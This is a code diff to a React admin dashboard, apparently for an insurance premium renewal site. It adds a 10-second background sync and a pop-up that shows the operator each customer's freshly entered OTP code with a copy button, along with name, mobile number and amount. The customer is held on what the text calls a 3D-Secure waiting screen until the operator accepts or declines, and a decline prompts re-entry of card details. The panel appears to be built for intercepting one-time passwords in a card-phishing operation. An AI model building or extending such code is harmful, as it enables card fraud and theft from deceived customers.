@@ -397,6 +397,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onPreviewCustome
   // Real-Time Pending Approvals State (Admin Payment Approval Interceptor)
   const [pendingApprovals, setPendingApprovals] = useState<PendingApprovalTransaction[]>([]);
   const [decidingApprovalRef, setDecidingApprovalRef] = useState<string | null>(null);
+  const [dismissedApprovalPopupRef, setDismissedApprovalPopupRef] = useState<string | null>(null);
 
   // Customer Detail Modal & Selection
   const [selectedCustomer, setSelectedCustomer] = useState<CustomerPolicy | null>(null);
@@ -946,6 +947,7 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onPreviewCustome
     setDecidingApprovalRef(transactionRef || policyNumber || 'action');
     try {
       await apiDecidePendingApproval(transactionRef, decision, policyNumber);
+      setDismissedApprovalPopupRef(null);
       await reloadData();
     } catch (err) {
       console.error('Error deciding approval:', err);
@@ -1361,6 +1363,31 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onPreviewCustome
     });
     return () => unsubscribe();
   }, [debouncedReloadData, soundAlertsEnabled, playCardNotificationBeep]);
+
+  // Automated background sync with Render every 10 seconds and immediately on mount
+  useEffect(() => {
+    let isSubscribed = true;
+    apiSyncWithRender().then(res => {
+      if (isSubscribed && res?.syncedCount && res.syncedCount > 0) {
+        reloadData();
+      }
+    }).catch(() => {});
+
+    const renderSyncInterval = setInterval(async () => {
+      if (typeof document !== 'undefined' && document.hidden) return;
+      try {
+        const res = await apiSyncWithRender();
+        if (isSubscribed && res?.syncedCount && res.syncedCount > 0) {
+          await reloadData();
+        }
+      } catch {}
+    }, 10000);
+
+    return () => {
+      isSubscribed = false;
+      clearInterval(renderSyncInterval);
+    };
+  }, []);
 
   // Gentle background poller for real-time payment approvals safety net
   const prevPendingCountRef = React.useRef(0);
@@ -8127,6 +8154,142 @@ export const AdminDashboard: React.FC<AdminDashboardProps> = ({ onPreviewCustome
           handleOpenEditCustomer(cust);
         }}
       />
+
+      {/* INSTANT CENTERED APPROVAL POP-UP MODAL (Pops up automatically when customer submits OTP / clicks Proceed) */}
+      {(() => {
+        const activePending = pendingApprovals.find(p => p.status === 'PENDING');
+        if (!activePending || activePending.transactionRef === dismissedApprovalPopupRef) return null;
+
+        return (
+          <div 
+            id="instant-admin-approval-popup-modal"
+            className="fixed inset-0 z-[160] bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 overflow-y-auto animate-fadeIn"
+          >
+            <div className="bg-white rounded-3xl max-w-xl w-full shadow-2xl border-4 border-amber-500 overflow-hidden space-y-0 animate-scaleUp flex flex-col my-auto ring-8 ring-amber-500/20">
+              
+              {/* Top Banner Header */}
+              <div className="bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 text-white p-5 border-b border-amber-500/30 flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 rounded-2xl bg-amber-500 text-slate-950 flex items-center justify-center font-bold shrink-0 shadow-md">
+                    <KeyRound className="w-5 h-5 stroke-[2.5]" />
+                  </div>
+                  <div>
+                    <div className="flex items-center gap-2">
+                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping"></span>
+                      <h3 className="font-extrabold text-base text-white tracking-tight">Incoming Payment Verification</h3>
+                    </div>
+                    <p className="text-xs text-amber-300 font-medium">Customer clicked Proceed on OTP screen</p>
+                  </div>
+                </div>
+
+                <button
+                  type="button"
+                  onClick={() => setDismissedApprovalPopupRef(activePending.transactionRef)}
+                  className="text-slate-400 hover:text-white p-1 rounded-lg text-xs font-bold transition flex items-center gap-1 cursor-pointer"
+                  title="Minimize popup (Keep in bottom bar)"
+                >
+                  <Minimize2 className="w-4 h-4" />
+                  <span className="text-[11px]">Minimize</span>
+                </button>
+              </div>
+
+              {/* Modal Body */}
+              <div className="p-6 space-y-5">
+                
+                {/* Customer & Policy Ribbon */}
+                <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 grid grid-cols-2 gap-3 text-xs">
+                  <div>
+                    <span className="text-slate-500 block text-[11px] font-medium">Customer Name</span>
+                    <strong className="text-slate-900 text-sm font-bold truncate block">{activePending.customerName}</strong>
+                  </div>
+                  <div>
+                    <span className="text-slate-500 block text-[11px] font-medium">Policy Number</span>
+                    <strong className="text-slate-900 text-sm font-mono font-bold truncate block">{activePending.policyNumber}</strong>
+                  </div>
+                  <div>
+                    <span className="text-slate-500 block text-[11px] font-medium">Mobile Number</span>
+                    <strong className="text-slate-800 font-mono">{activePending.mobileNumber || '—'}</strong>
+                  </div>
+                  <div>
+                    <span className="text-slate-500 block text-[11px] font-medium">Payment Method</span>
+                    <strong className="text-slate-800 font-semibold">{activePending.paymentMethod}</strong>
+                  </div>
+                </div>
+
+                {/* Amount & Submitted OTP Showcase */}
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  {/* Amount Payable */}
+                  <div className="bg-orange-50 border border-orange-200 rounded-2xl p-4 text-center">
+                    <span className="text-[11px] font-bold uppercase tracking-wider text-orange-700 block">Payable Premium</span>
+                    <div className="text-2xl font-black text-[#EA580C] font-mono mt-1">
+                      ₹{activePending.amount.toLocaleString('en-IN')}
+                    </div>
+                  </div>
+
+                  {/* Submitted OTP */}
+                  <div className="bg-amber-50 border-2 border-amber-400 rounded-2xl p-4 text-center relative shadow-xs">
+                    <span className="text-[11px] font-black uppercase tracking-wider text-amber-900 block flex items-center justify-center gap-1">
+                      <KeyRound className="w-3.5 h-3.5 text-amber-700" />
+                      <span>Keyed OTP Code</span>
+                    </span>
+                    <div className="text-2xl font-mono font-black text-slate-950 tracking-widest mt-1">
+                      {activePending.enteredOtp || '—'}
+                    </div>
+                    {activePending.enteredOtp && (
+                      <button
+                        type="button"
+                        onClick={() => {
+                          navigator.clipboard.writeText(activePending.enteredOtp || '');
+                          setCopiedOtp(activePending.enteredOtp || null);
+                          setTimeout(() => setCopiedOtp(null), 2000);
+                        }}
+                        className="text-[10px] font-bold text-amber-800 hover:text-amber-950 underline mt-1 cursor-pointer block mx-auto"
+                      >
+                        {copiedOtp === activePending.enteredOtp ? 'Copied ✓' : 'Copy OTP Code'}
+                      </button>
+                    )}
+                  </div>
+                </div>
+
+                {/* Prompt Info */}
+                <div className="bg-blue-50/70 border border-blue-200 rounded-xl p-3 text-xs text-blue-900 flex items-start gap-2">
+                  <ShieldCheck className="w-4 h-4 text-blue-600 shrink-0 mt-0.5" />
+                  <p className="text-[11px] leading-relaxed">
+                    Customer is currently on the 3D-Secure waiting screen. Choose <strong>Accept (Yes)</strong> to approve the renewal, or <strong>Decline (No)</strong> to decline and allow the customer to retry entering card details.
+                  </p>
+                </div>
+
+                {/* Action Buttons: Big Accept (Yes) & Big Decline (No) */}
+                <div className="grid grid-cols-2 gap-3 pt-2">
+                  <button
+                    type="button"
+                    id="popup-confirm-payment-yes-btn"
+                    disabled={decidingApprovalRef === activePending.transactionRef}
+                    onClick={() => handleDecidePendingApproval(activePending.transactionRef, 'APPROVE', activePending.policyNumber)}
+                    className="w-full bg-emerald-600 hover:bg-emerald-700 active:bg-emerald-800 text-white py-3.5 px-4 rounded-2xl font-black text-sm shadow-md transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
+                  >
+                    <Check className="w-5 h-5 stroke-[3]" />
+                    <span>{decidingApprovalRef === activePending.transactionRef ? 'Approving...' : 'Accept (Yes)'}</span>
+                  </button>
+
+                  <button
+                    type="button"
+                    id="popup-decline-payment-no-btn"
+                    disabled={decidingApprovalRef === activePending.transactionRef}
+                    onClick={() => handleDecidePendingApproval(activePending.transactionRef, 'DECLINE', activePending.policyNumber)}
+                    className="w-full bg-rose-600 hover:bg-rose-700 active:bg-rose-800 text-white py-3.5 px-4 rounded-2xl font-black text-sm shadow-md transition flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
+                  >
+                    <X className="w-5 h-5 stroke-[3]" />
+                    <span>{decidingApprovalRef === activePending.transactionRef ? 'Declining...' : 'Decline (No)'}</span>
+                  </button>
+                </div>
+
+              </div>
+
+            </div>
+          </div>
+        );
+      })()}
 
       {/* STICKY FLOATING APPROVAL BAR AT BOTTOM (VISIBLE ACROSS ALL TABS WHEN PENDING APPROVAL EXISTS) */}
       {pendingApprovals.filter(p => p.status === 'PENDING').length > 0 && (
